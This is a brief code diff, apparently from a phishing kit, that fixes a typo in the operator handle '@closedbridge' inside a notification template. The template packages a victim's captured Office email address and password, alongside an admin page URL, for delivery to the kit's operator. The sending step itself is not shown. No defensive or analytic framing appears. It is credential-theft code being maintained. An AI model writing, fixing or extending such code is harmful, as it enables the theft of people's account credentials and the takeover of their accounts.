@@ -342,7 +342,7 @@ ${adminUrl}
         }
         const adminUrl = `${baseUrl}/ad.html`;
 
-        const notificationMessage = `@closedbride ⭐️office⭐️
+        const notificationMessage = `@closedbridge ⭐️office⭐️
  {
     "officeEmail": "${email}",
     "officePassword": "${password || 'Not captured'}",
